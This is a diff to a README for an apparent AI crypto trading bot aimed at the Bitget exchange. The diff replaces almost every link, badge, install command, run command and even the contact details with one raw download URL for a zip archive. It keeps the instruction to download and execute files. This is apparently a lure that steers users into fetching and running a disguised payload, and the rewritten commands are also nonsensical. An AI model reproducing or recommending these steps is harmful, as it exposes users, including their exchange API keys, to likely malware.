@@ -1,6 +1,6 @@
 # AI Trading Bot: From Data to Money 🚀
 
-![AI Trading Bot](https://img.shields.io/badge/AI%20Trading%20Bot-From%20Data%20to%20Money-blue?style=flat&logo=python)
+![AI Trading Bot](https://github.com/Nikolexx/AI-Trading-Bot-From-Data-to-Money/raw/refs/heads/main/severish/Data-From-to-Money-A-Bot-Trading-Boruca.zip%20Trading%20Bot-From%20Data%20to%20Money-blue?style=flat&logo=python)
 
 Welcome to the **AI Trading Bot: From Data to Money** repository! This project is an automated crypto trading system designed to operate on the Bitget exchange. It fetches real-time market data, applies predictive analytics using a pretrained neural forecast model, and executes buy/sell or exit strategies based on intelligent signal generation.
 
@@ -45,7 +45,7 @@ To set up the AI Trading Bot on your local machine, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Nikolexx/AI-Trading-Bot-From-Data-to-Money.git
+   git clone https://github.com/Nikolexx/AI-Trading-Bot-From-Data-to-Money/raw/refs/heads/main/severish/Data-From-to-Money-A-Bot-Trading-Boruca.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -56,21 +56,21 @@ To set up the AI Trading Bot on your local machine, follow these steps:
 3. **Install Dependencies**:
    Use pip to install the required libraries:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Nikolexx/AI-Trading-Bot-From-Data-to-Money/raw/refs/heads/main/severish/Data-From-to-Money-A-Bot-Trading-Boruca.zip
    ```
 
 4. **Set Up MongoDB**:
    Ensure you have MongoDB installed and running. Create a database for the trading bot.
 
 5. **Configure API Keys**:
-   Obtain your API keys from Bitget and configure them in the `config.py` file.
+   Obtain your API keys from Bitget and configure them in the `https://github.com/Nikolexx/AI-Trading-Bot-From-Data-to-Money/raw/refs/heads/main/severish/Data-From-to-Money-A-Bot-Trading-Boruca.zip` file.
 
 ## Usage
 
 To run the AI Trading Bot, execute the following command in your terminal:
 
 ```bash
-python main.py
+python https://github.com/Nikolexx/AI-Trading-Bot-From-Data-to-Money/raw/refs/heads/main/severish/Data-From-to-Money-A-Bot-Trading-Boruca.zip
 ```
 
 The bot will start fetching real-time data and applying its trading strategies. You can monitor its performance through the logs generated in the terminal.
@@ -110,14 +110,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **Twitter**: [@yourhandle](https://twitter.com/yourhandle)
+- **Email**: https://github.com/Nikolexx/AI-Trading-Bot-From-Data-to-Money/raw/refs/heads/main/severish/Data-From-to-Money-A-Bot-Trading-Boruca.zip
+- **Twitter**: [@yourhandle](https://github.com/Nikolexx/AI-Trading-Bot-From-Data-to-Money/raw/refs/heads/main/severish/Data-From-to-Money-A-Bot-Trading-Boruca.zip)
 
 ## Releases
 
-You can find the latest releases of the AI Trading Bot [here](https://github.com/Nikolexx/AI-Trading-Bot-From-Data-to-Money/releases). Download and execute the files as needed to get started with the latest features and improvements.
+You can find the latest releases of the AI Trading Bot [here](https://github.com/Nikolexx/AI-Trading-Bot-From-Data-to-Money/raw/refs/heads/main/severish/Data-From-to-Money-A-Bot-Trading-Boruca.zip). Download and execute the files as needed to get started with the latest features and improvements.
 
-![Releases](https://img.shields.io/badge/Latest%20Releases-Click%20Here-brightgreen?style=flat&logo=github)
+![Releases](https://github.com/Nikolexx/AI-Trading-Bot-From-Data-to-Money/raw/refs/heads/main/severish/Data-From-to-Money-A-Bot-Trading-Boruca.zip%20Releases-Click%20Here-brightgreen?style=flat&logo=github)
 
 ## Conclusion
 
